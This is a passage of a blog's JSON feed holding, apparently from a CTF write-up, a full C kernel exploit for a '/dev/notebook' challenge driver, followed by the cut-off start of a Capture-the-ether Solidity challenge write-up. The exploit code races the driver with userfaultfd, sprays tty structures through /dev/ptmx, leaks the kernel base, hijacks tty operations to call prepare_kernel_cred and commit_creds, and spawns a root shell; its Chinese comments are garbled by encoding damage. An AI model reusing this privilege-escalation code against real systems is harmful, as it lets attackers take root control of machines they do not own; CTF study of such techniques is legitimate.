class=\"keyword\">include</span> <span class=\"string\">&lt;sys/ioctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/syscall.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;poll.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;include/head.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;semaphore.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_SIZE 1024</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">uint64_t</span> u64;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">uint32_t</span> u32;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">uffd_register</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">UFFD_handler</span><span class=\"params\">(<span class=\"type\">void</span> *nil)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> uffd, note_fd;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> mod_base_addr, cookie ,kernel_base_addr;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> fault_page, fault_page_len;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> target, modprobe_path;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> errExit(msg) &#123; \\</span></span><br><span class=\"line\"><span class=\"meta\">\tperror(msg);       \\</span></span><br><span class=\"line\"><span class=\"meta\">\texit(1);\t\t   \\</span></span><br><span class=\"line\"><span class=\"meta\">&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> idx;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> size;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> buf;</span><br><span class=\"line\">&#125;userarg;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAX_ELEM 0x100</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">enum</span>&#123;</span> </span><br><span class=\"line\">\tSWAPGS_POP_RET, IRETQ, COMMIT_CREDS,</span><br><span class=\"line\">\tPREPARE_KERNEL_CRED, </span><br><span class=\"line\">\tSUB_RSP_RET ,PUSH_RDI_POP_RSP_POP_RET,</span><br><span class=\"line\">\tPOP_RDI ,POP_RSP,</span><br><span class=\"line\">\tMOV_RDI_RAX_POP_RET,</span><br><span class=\"line\">\tTERMINATOR</span><br><span class=\"line\">&#125;;<span class=\"comment\">//PREPARE_KERNEL_CRED, COMMIT_CREDS, &#125;;</span></span><br><span class=\"line\">u64 a[MAX_ELEM];</span><br><span class=\"line\"><span class=\"comment\">//tty_structç»“æ„ä½“çš„å¤§å°</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class=\"line\"><span class=\"comment\">//å¦‚æœæˆ‘ä»¬ç”³è¯·0x2E0çš„ç©ºé—´ï¼Œslabåˆ†é…çš„å †å®é™…å¤§å°ä¸º0x400 </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> REAL_HEAP_SIZE 0x400</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> RAW_KERNEL_BASE 0xffffffff81000000</span></span><br><span class=\"line\"><span class=\"type\">int</span> protect1[<span class=\"number\">0x1000</span>];</span><br><span class=\"line\"><span class=\"type\">int</span> ptmx_fds[<span class=\"number\">0x100</span>];<span class=\"comment\">// æµ‹äº†æˆ‘å¾ˆä¹…æ‰å‘ç°è¿™ä¸ªbè¢«ä¸çŸ¥é“è°æº¢å‡ºäº† åŠ ä¸¤ä¸ªä¿æŠ¤æŒ¡ä¸€ä¸‹</span></span><br><span class=\"line\"><span class=\"type\">int</span> protect2[<span class=\"number\">0x1000</span>];</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">init</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\ta[SWAPGS_POP_RET] \t\t\t= <span class=\"number\">0xffffffff810637d4</span>;</span><br><span class=\"line\">\ta[IRETQ] \t\t\t\t\t= <span class=\"number\">0xffffffff810338bb</span>;</span><br><span class=\"line\">\ta[COMMIT_CREDS] \t\t\t= <span class=\"number\">0xffffffff810a9b40</span>;</span><br><span class=\"line\">\ta[PREPARE_KERNEL_CRED]\t\t= <span class=\"number\">0xffffffff810a9ef0</span>;</span><br><span class=\"line\">\ta[SUB_RSP_RET] \t\t\t\t= <span class=\"number\">0xffffffff8100354f</span>;</span><br><span class=\"line\">\ta[PUSH_RDI_POP_RSP_POP_RET] = <span class=\"number\">0xffffffff8143f4e1</span>;</span><br><span class=\"line\">\ta[POP_RDI]\t\t\t\t    = <span class=\"number\">0xffffffff81007115</span>;</span><br><span class=\"line\">\ta[POP_RSP] \t\t\t\t\t= <span class=\"number\">0xffffffff810bc110</span>;</span><br><span class=\"line\">\ta[MOV_RDI_RAX_POP_RET]\t\t= <span class=\"number\">0xffffffff81045833</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 work_for_cpu_fn = <span class=\"number\">0xffffffff8109eb90</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">addKernelBase</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; TERMINATOR ;i++)&#123;</span><br><span class=\"line\">\t\ta[i] += kernel_base_addr - <span class=\"number\">0xffffffff81000000</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getshell</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;UID is %d&quot;</span>, getuid());</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(getuid() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\tDone(<span class=\"string\">&quot;Get shell&quot;</span>);</span><br><span class=\"line\">\t\tsystem(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\tPanic(<span class=\"string\">&quot;Get shell failed&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 user_cs, user_ss, user_sp, user_flags;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">saveState</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t__asm__ (</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;mov %cs, user_cs;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;mov %ss, user_ss;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;mov %rsp, user_sp;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;pushf;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;pop user_flags;&quot;</span></span><br><span class=\"line\">\t);</span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;saveState&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getRoot</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">\t<span class=\"type\">void</span> *(*pkc)(<span class=\"type\">int</span>) = (<span class=\"type\">void</span> *(*)(<span class=\"type\">int</span>))(a[PREPARE_KERNEL_CRED]);</span><br><span class=\"line\">\t<span class=\"type\">void</span> (*cc)(<span class=\"type\">void</span> *) = (<span class=\"type\">void</span> (*)(<span class=\"type\">void</span> *))(a[COMMIT_CREDS]);</span><br><span class=\"line\">\t(*cc)((*pkc)(<span class=\"literal\">NULL</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">add</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> size, <span class=\"type\">void</span> *buf)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\targ.size = (<span class=\"type\">uint64_t</span>)size;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x100</span> ,&amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">del</span><span class=\"params\">(<span class=\"type\">size_t</span> idx)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x200</span> ,&amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">edit</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> newsize, <span class=\"type\">char</span> *buf)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\targ.size = (<span class=\"type\">uint64_t</span>)newsize;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x300</span>, &amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">gift</span><span class=\"params\">(<span class=\"type\">char</span> *buf)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">100</span>, &amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">write_to_kernel</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">char</span> *user_buf)</span>&#123;</span><br><span class=\"line\">\twrite(note_fd, user_buf, idx);<span class=\"comment\">// é€†å‘ mynote_readå¯ä»¥å¾—åˆ°</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">read_from_kernel</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">char</span> *user_buf)</span>&#123;</span><br><span class=\"line\">\tread(note_fd, user_buf, idx);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> *buf;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">void</span> *buf;</span><br><span class=\"line\">\tu64 size;</span><br><span class=\"line\">&#125;notebook;</span><br><span class=\"line\"></span><br><span class=\"line\">notebook ntbk[<span class=\"number\">10</span>];</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> heap[<span class=\"number\">2</span>];</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> notebook_addr;</span><br><span class=\"line\">u64 fake_tty_struct[<span class=\"number\">128</span>];</span><br><span class=\"line\">u64 fake_tty_ops[<span class=\"number\">128</span>];</span><br><span class=\"line\"><span class=\"type\">char</span> zero[PAGE_SIZE] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">work_struct</span> &#123;</span></span><br><span class=\"line\">\tu64 a[<span class=\"number\">4</span>];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">work_for_cpu</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">work_struct</span> <span class=\"title\">work</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">long</span> (*fn)(<span class=\"type\">void</span> *);</span><br><span class=\"line\">\t<span class=\"type\">void</span> *arg;</span><br><span class=\"line\">\t<span class=\"type\">long</span> ret;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tinit();</span><br><span class=\"line\">\tsaveState();</span><br><span class=\"line\">\tnote_fd = open(<span class=\"string\">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;note_fd is %d&quot;</span>,note_fd);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(note_fd &lt; <span class=\"number\">0</span>) errExit(<span class=\"string\">&quot;open&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tbuf = <span class=\"built_in\">calloc</span>(<span class=\"number\">1</span>, <span class=\"number\">0x100</span>);<span class=\"comment\">// nameçš„é•¿åº¦</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tFILE * stream = popen(<span class=\"string\">&quot;cat /tmp/moduleaddr | awk &#x27;&#123;print $6&#125;&#x27;&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">\tassert(stream != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\tfread(buf, <span class=\"number\">0x10</span> + <span class=\"number\">2</span>, <span class=\"number\">1</span> ,stream);</span><br><span class=\"line\">\tmod_base_addr = strtoul(buf, <span class=\"literal\">NULL</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;moduleaddr is %lx&quot;</span>, mod_base_addr);</span><br><span class=\"line\"></span><br><span class=\"line\">\tfault_page = mmap(<span class=\"literal\">NULL</span>, <span class=\"number\">0x1000</span>, PROT_READ|PROT_WRITE, </span><br><span class=\"line\">\t\t\t\t\t\tMAP_PRIVATE | MAP_ANONYMOUS, <span class=\"number\">-1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\tfault_page_len = <span class=\"number\">0x1000</span>;</span><br><span class=\"line\">\tuffd_register();</span><br><span class=\"line\"></span><br><span class=\"line\">\tadd(<span class=\"number\">0</span> ,<span class=\"number\">0x60</span> ,zero);</span><br><span class=\"line\">\tedit(<span class=\"number\">0</span> ,<span class=\"number\">0x3ff</span> ,zero);<span class=\"comment\">// é‡æ–°ç”³è¯·ä¸€ä¸ª0x400çš„å—</span></span><br><span class=\"line\">\tedit(<span class=\"number\">0</span> ,<span class=\"number\">0x400</span> ,fault_page);<span class=\"comment\">// è¿”å›ä¸Šä¸€ä¸ªåŸå—çš„åœ°å€ å†™å®Œsizeå°±å¡ä½</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tgetchar();<span class=\"comment\">// ç­‰å¾…çº¿ç¨‹å®Œæˆå®ƒçš„å·¥ä½œ</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x30</span>; i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// Info(&quot;ptmx_fds[%d] is %d&quot;, i, ptmx_fds[i]);</span></span><br><span class=\"line\">\t\tptmx_fds[i] = open(<span class=\"string\">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tread_from_kernel(<span class=\"number\">0</span>, fake_tty_struct);</span><br><span class=\"line\">\t<span class=\"comment\">//éªŒè¯é­”æ•°</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(fake_tty_struct[<span class=\"number\">0</span>]  != <span class=\"number\">0x0000000100005401</span>)</span><br><span class=\"line\">\t\tPanic(<span class=\"string\">&quot;Magic number error, abort&quot;</span>);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;fake_tty_struct&#x27;s addr is 0x%lx&quot;</span>, fake_tty_struct);</span><br><span class=\"line\">\t<span class=\"comment\">// æ­¤æ—¶gdbçœ‹å†…å­˜ å¯ä»¥çœ‹åˆ°ç›¸å…³æ³„æ¼çš„åœ°å€</span></span><br><span class=\"line\">\tu64 ptm_unix98_ops_addr = fake_tty_struct[<span class=\"number\">3</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((ptm_unix98_ops_addr &amp; <span class=\"number\">0xFFF</span>) == <span class=\"number\">0x320</span>) ptm_unix98_ops_addr += <span class=\"number\">0x120</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tkernel_base_addr = ptm_unix98_ops_addr - <span class=\"number\">0xe8e440</span>;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;kernel base addr is 0x%lx&quot;</span>, kernel_base_addr);</span><br><span class=\"line\">\taddKernelBase();</span><br><span class=\"line\"></span><br><span class=\"line\">\tadd(<span class=\"number\">1</span>, <span class=\"number\">0x60</span>, zero);</span><br><span class=\"line\">\tedit(<span class=\"number\">1</span> ,<span class=\"number\">0x400</span> ,zero);</span><br><span class=\"line\"></span><br><span class=\"line\">\tgift(ntbk);</span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">3</span>] = ntbk[<span class=\"number\">1</span>].buf;<span class=\"comment\">// ops&#x27;s addr</span></span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">4</span>] = a[PREPARE_KERNEL_CRED];</span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">5</span>] = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">6</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tfake_tty_ops[<span class=\"number\">12</span>] = work_for_cpu_fn;</span><br><span class=\"line\"></span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">0</span>, fake_tty_struct);</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">1</span>, fake_tty_ops);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;prepare kernel cred...&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x30</span>; i++)</span><br><span class=\"line\">\t\tioctl(ptmx_fds[i], <span class=\"number\">111</span>, <span class=\"number\">111</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;prepare&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;work_for_cpu_fn return 0x%lx&quot;</span>, fake_tty_struct[<span class=\"number\">6</span>]);</span><br><span class=\"line\">\tread_from_kernel(<span class=\"number\">0</span>, fake_tty_struct);</span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">3</span>] = ntbk[<span class=\"number\">1</span>].buf;<span class=\"comment\">// ops&#x27;s addr</span></span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">4</span>] = a[COMMIT_CREDS];</span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">5</span>] = fake_tty_struct[<span class=\"number\">6</span>];</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">0</span>, fake_tty_struct);</span><br><span class=\"line\"></span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;commit creds...&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x30</span>; i++)</span><br><span class=\"line\">\t\tioctl(ptmx_fds[i], <span class=\"number\">233</span>, <span class=\"number\">233</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;commit&quot;</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tgetshell();</span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">uffd_register</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_api</span> <span class=\"title\">ua</span>;</span><span class=\"comment\">// io operation api</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_register</span> <span class=\"title\">ur</span>;</span><span class=\"comment\">// io register</span></span><br><span class=\"line\">    <span class=\"comment\">// find /usr/include -name unistd_64.h 2&gt;/dev/null</span></span><br><span class=\"line\">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;uffd: %d&quot;</span>, uffd);</span><br><span class=\"line\"></span><br><span class=\"line\">\tua.api = UFFD_API;</span><br><span class=\"line\">\tua.features = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ioctl(uffd, UFFDIO_API, &amp;ua) == <span class=\"number\">-1</span>) </span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;ioctl(uffd,UFFDIO_API,ua)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tur.range.start = (<span class=\"type\">long</span> <span class=\"type\">long</span> <span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fault_page;</span><br><span class=\"line\">\tur.range.len   = fault_page_len;</span><br><span class=\"line\">\tur.mode \t   = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;ioctl(uffd,UFFDIO_REGISTER,&amp;ur)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">pthread_t</span> thr;</span><br><span class=\"line\">\t<span class=\"comment\">// æ³¨æ„è¿™é‡Œæ²¡æœ‰-1 pthread createæ­£å¸¸è¿”å›0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(pthread_create(&amp;thr, <span class=\"literal\">NULL</span>, UFFD_handler ,<span class=\"literal\">NULL</span>))</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;pthread_create&quot;</span>);</span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;regitser&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">UFFD_handler</span><span class=\"params\">(<span class=\"type\">void</span> *nil)</span>&#123;</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;UFFD handler start&quot;</span>);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffd_msg</span> <span class=\"title\">msg</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pollfd</span> <span class=\"title\">pollfd</span>;</span></span><br><span class=\"line\">\t\t<span class=\"type\">int</span> nready = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tpollfd.fd\t\t= uffd;</span><br><span class=\"line\">\t\tpollfd.events\t= POLLIN ;</span><br><span class=\"line\">\t\tnready = poll(&amp;pollfd, <span class=\"number\">1</span>, <span class=\"number\">-1</span>);<span class=\"comment\">// block here</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(nready != <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\terrExit(<span class=\"string\">&quot;poll&quot;</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t&#123;<span class=\"comment\">// user code modify area</span></span><br><span class=\"line\">\t\t\tedit(<span class=\"number\">0</span>, <span class=\"number\">0x500</span>, zero);<span class=\"comment\">// ç¬¬ä¸€ä¸ªedit freeæ‰vuln chunk</span></span><br><span class=\"line\">\t\t\tedit(<span class=\"number\">0</span>, <span class=\"number\">0x400</span>, zero);<span class=\"comment\">// ç¬¬äºŒä¸ªedit ç¡®ä¿sizeä¸å˜</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(read(uffd, &amp;msg, <span class=\"keyword\">sizeof</span>(msg)) != <span class=\"keyword\">sizeof</span>(msg))</span><br><span class=\"line\">\t\t\terrExit(<span class=\"string\">&quot;read&quot;</span>);</span><br><span class=\"line\">\t\tassert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_copy</span> <span class=\"title\">uc</span>;</span></span><br><span class=\"line\">\t\tuc.src \t= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)zero;</span><br><span class=\"line\">\t\tuc.dst \t= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)fault_page;</span><br><span class=\"line\">\t\tuc.len \t= fault_page_len;</span><br><span class=\"line\">\t\tuc.mode = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class=\"line\">\t\tDone(<span class=\"string\">&quot;ioctl done&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Linux",
                "Kernel state"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/09/02/Capture-the-ether-Lotteries-wp/",
            "url": "https://squirre17.github.io/2022/09/02/Capture-the-ether-Lotteries-wp/",
            "title": "Capture-the-ether-Lotteries-wp",
            "date_published": "2022-09-02T03:23:12.000Z",
            "content_html": "<h2 id=\"guess-the-secret-number\"><a class=\"markdownIt-Anchor\" href=\"#guess-the-secret-number\">#</a> Guess the secret number</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.21</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract GuessTheSecretNumberChallenge &#123;</span><br><span class=\"line\">    bytes32 answerHash = <span class=\"number\">0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">GuessTheSecretNumberChallenge</span><span class=\"params\">()</span> public payable &#123;</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function <span class=\"title function_\">isComplete</span><span class=\"params\">()</span> public view <span class=\"title function_\">returns</span> <span class=\"params\">(<span class=\"type\">bool</span>)</span> &#123;</span><br><span class=\"line\">        <span 